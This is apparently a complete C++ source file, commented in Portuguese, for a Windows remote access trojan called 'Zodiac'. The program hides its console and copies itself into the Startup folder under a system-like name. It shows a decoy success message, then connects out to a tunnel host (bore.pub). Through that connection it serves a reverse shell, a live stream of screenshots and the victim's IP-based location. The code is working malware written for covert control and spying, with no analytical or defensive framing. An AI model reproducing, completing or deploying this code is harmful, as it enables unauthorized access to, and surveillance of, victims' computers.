#include <cstdint>
#include <cstdio>       
#include <winsock2.h>   
#include <ws2tcpip.h>   
#include <windows.h>    
#include <wininet.h>    
#include <gdiplus.h>    
#include <string>
#include <vector>
#include <sstream>

#pragma comment(lib, "Ws2_32.lib") 
#pragma comment(lib, "gdiplus.lib") 
#pragma comment(lib, "wininet.lib") 

#define DEFAULT_BUFFER 1024        
#define LARGE_RESPONSE_BUFFER 65536 

using namespace std;
using namespace Gdiplus;

// Protótipos das funções do sistema
bool ConectarCentralZodiac(SOCKET &sock, const string& host, const string& porta);
bool TransmitirTelaJPEG(SOCKET sock);
int ObterClsidCodificador(const WCHAR* format, CLSID* pClsid);
void exec(char* returnval, int returnsize, const char *command);
string ObterGeolocalizacaoIP();
void MoverParaInicializacao();
int main() {
    // 🖥️ Furtividade Nativa: Cria um console oculto e esconde a interface gráfica
    HWND stealth;
    AllocConsole();
    stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(stealth, 0); 

    // Executa a persistência na pasta de inicialização (Startup)
    MoverParaInicializacao();

    // Inicialização da biblioteca de renderização gráfica GDI+
    GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken;
    GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);

    MessageBoxA(NULL, "Módulo de Sincronização ZODÍACO Ativado com Sucesso.", "ZODIAC SYSTEM", MB_OK | MB_ICONINFORMATION);

    WSADATA wsaData;
    SOCKET conexao_socket = INVALID_SOCKET;
    
    // ========================================================================
    // ⚙️ DIRECIONAMENTO DE REDE EXTERNA (Injetado automaticamente pelo P0ISON.cpp)
    // ========================================================================
    string IP_CENTRAL = "bore.pub";
    string PORTA_CENTRAL = "16073";
    // ========================================================================

    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        GdiplusShutdown(gdiplusToken);
        return 1;
    }

    if (ConectarCentralZodiac(conexao_socket, IP_CENTRAL, PORTA_CENTRAL)) {
        string status_msg = "[🛰️ CONEXÃO ESTABELECIDA] Terminal ativo. Comandos: 'screen', 'geo' ou comandos shell.\n\nZODIAC_SHELL> ";
        send(conexao_socket, status_msg.c_str(), status_msg.length(), 0);
        
        char buffer[DEFAULT_BUFFER];
        while (true) {
            memset(buffer, 0, DEFAULT_BUFFER);
            int bytes_recebidos = recv(conexao_socket, buffer, DEFAULT_BUFFER - 1, 0);
            
            if (bytes_recebidos <= 0) break; 
            
            string comando(buffer);
            while(!comando.empty() && (comando.back() == '\n' || comando.back() == '\r')) {
                comando.pop_back();
            }

            if (comando.empty()) {
                send(conexao_socket, "ZODIAC_SHELL> ", 14, 0);
                continue;
            }

            // Dispara o loop contínuo de streaming de tela (~30 FPS)
            if (comando == "screen") {
                while (true) {
                    if (!TransmitirTelaJPEG(conexao_socket)) break; 
                    Sleep(33); 
                }
                break; 
            } 
            // Retorna os dados geográficos e o provedor com base no IP público
            else if (comando == "geo") {
                string dados_geo = ObterGeolocalizacaoIP();
                string resposta_geo = "\n[🌍 GEOLOCALIZAÇÃO DO ALVO]:\n" + dados_geo + "\nZODIAC_SHELL> ";
                send(conexao_socket, resposta_geo.c_str(), resposta_geo.length(), 0);
            }
            // Processa o comando de texto nativo no prompt oculto (Reverse Shell)
            else {
                vector<char> resposta_terminal(LARGE_RESPONSE_BUFFER, 0);
                exec(resposta_terminal.data(), LARGE_RESPONSE_BUFFER, comando.c_str());
                
                string resposta_final = string(resposta_terminal.data()) + "\nZODIAC_SHELL> ";
                send(conexao_socket, resposta_final.c_str(), resposta_final.length(), 0);
            }
        }
    }

    if (conexao_socket != INVALID_SOCKET) closesocket(conexao_socket);
    WSACleanup();
    GdiplusShutdown(gdiplusToken); 
    return 0;
}
bool TransmitirTelaJPEG(SOCKET sock) {
    int largura = GetSystemMetrics(SM_CXSCREEN);
    int altura = GetSystemMetrics(SM_CYSCREEN);

    HDC hdcScreen = GetDC(NULL); 
    HDC hdcMem = CreateCompatibleDC(hdcScreen);
    HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, largura, altura);
    HGDIOBJ hOldObj = SelectObject(hdcMem, hBitmap);
    
    BitBlt(hdcMem, 0, 0, largura, altura, hdcScreen, 0, 0, SRCCOPY);
    
    Bitmap* gdiPlusBitmap = new Bitmap(hBitmap, NULL); 
    CLSID clsidEncoder;
    if (ObterClsidCodificador(L"image/jpeg", &clsidEncoder) == -1) {
        delete gdiPlusBitmap;
        SelectObject(hdcMem, hOldObj);
        DeleteObject(hBitmap);
        DeleteDC(hdcMem);
        ReleaseDC(NULL, hdcScreen);
        return false;
    }
    
    bool envio_sucesso = false; 
    IStream* pStream = NULL;
    
    if (CreateStreamOnHGlobal(NULL, TRUE, &pStream) == S_OK) {
        gdiPlusBitmap->Save(pStream, &clsidEncoder, NULL);
        STATSTG statstg; 
        pStream->Stat(&statstg, STATFLAG_NONAME);
        uint32_t tamanho_jpeg = (uint32_t)statstg.cbSize.QuadPart;
        LARGE_INTEGER liZero = {0}; 
        pStream->Seek(liZero, STREAM_SEEK_SET, NULL);
        
        vector<char> buffer_imagem(tamanho_jpeg); 
        ULONG bytes_lidos; 
        pStream->Read(buffer_imagem.data(), tamanho_jpeg, &bytes_lidos);
        
        int status_envio = send(sock, (char*)&tamanho_jpeg, sizeof(tamanho_jpeg), 0);
        if (status_envio != SOCKET_ERROR) {
            int total_enviado = 0;
            while (total_enviado < (int)tamanho_jpeg) {
                int enviado = send(sock, buffer_imagem.data() + total_enviado, tamanho_jpeg - total_enviado, 0);
                if (enviado <= 0) { envio_sucesso = false; break; }
                total_enviado += enviado;
            }
            if (total_enviado >= (int)tamanho_jpeg) envio_sucesso = true;
        }
        pStream->Release();
    }
    delete gdiPlusBitmap; 
    SelectObject(hdcMem, hOldObj); 
    DeleteObject(hBitmap); 
    DeleteDC(hdcMem); 
    ReleaseDC(NULL, hdcScreen);
    return envio_sucesso;
}

int ObterClsidCodificador(const WCHAR* format, CLSID* pClsid) {
    UINT num = 0, size = 0; 
    GetImageEncodersSize(&num, &size); 
    if (size == 0) return -1;
    ImageCodecInfo* pImageCodecInfo = (ImageCodecInfo*)(malloc(size)); 
    if (pImageCodecInfo == NULL) return -1;
    GetImageEncoders(num, size, pImageCodecInfo);
    for (UINT j = 0; j < num; ++j) {
        if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0) { 
            *pClsid = pImageCodecInfo[j].Clsid; 
            free(pImageCodecInfo); 
            return j; 
        }
    }
    free(pImageCodecInfo); 
    return -1;
}
void exec(char* returnval, int returnsize, const char *command) {
    FILE* fp;
    char buffer[DEFAULT_BUFFER];
    if ((fp = _popen(command, "r")) == NULL) {
        snprintf(returnval, returnsize, "[x] Error executing command..\n");
        return;
    }
    while (fgets(buffer, sizeof(buffer), fp) != NULL) {
        if (strlen(returnval) + strlen(buffer) < (size_t)returnsize - 1) {
            strcat(returnval, buffer);
        } else break;
    }
    _pclose(fp);
}

void MoverParaInicializacao() {
    char local_atual[MAX_PATH];
    char local_destino[MAX_PATH];
    if (GetModuleFileNameA(NULL, local_atual, MAX_PATH)) {
        GetEnvironmentVariableA("APPDATA", local_destino, MAX_PATH);
        strcat(local_destino, "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\TarefaSistema.exe");
        CopyFileA(local_atual, local_destino, FALSE);
    }
}

string ObterGeolocalizacaoIP() {
    string resultado = "";
    HINTERNET hInternet = InternetOpenA("ZodiacAgent", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (hInternet) {
        HINTERNET hConnect = InternetOpenUrlA(hInternet, "http://ip-api.com", NULL, 0, INTERNET_FLAG_PRAGMA_NOCACHE | INTERNET_FLAG_RELOAD, 0);
        if (hConnect) {
            char buffer_leitura;
            DWORD bytes_lidos = 0;
            while (InternetReadFile(hConnect, &buffer_leitura, sizeof(buffer_leitura), &bytes_lidos) && bytes_lidos > 0) {
                resultado += buffer_leitura;
            }
            InternetCloseHandle(hConnect);
        }
        InternetCloseHandle(hInternet);
    }
    if (resultado.empty()) return "[x] Falha ao consultar localização.";
    return resultado;
}

bool ConectarCentralZodiac(SOCKET &sock, const string& host, const string& porta) {
    struct addrinfo hints, *result = NULL, *ptr = NULL; 
    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_INET; 
    hints.ai_socktype = SOCK_STREAM; 
    hints.ai_protocol = IPPROTO_TCP;
    
    if (getaddrinfo(host.c_str(), porta.c_str(), &hints, &result) != 0) return false;
    
    for (ptr = result; ptr != NULL; ptr = ptr->ai_next) {
        sock = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
        if (sock == INVALID_SOCKET) { 
            freeaddrinfo(result); 
            return false; 
        }
        if (connect(sock, ptr->ai_addr, (int)ptr->ai_addrlen) != SOCKET_ERROR) {
            break; 
        } 
        closesocket(sock); 
        sock = INVALID_SOCKET;
    }
    freeaddrinfo(result); 
    return (sock != INVALID_SOCKET);
}
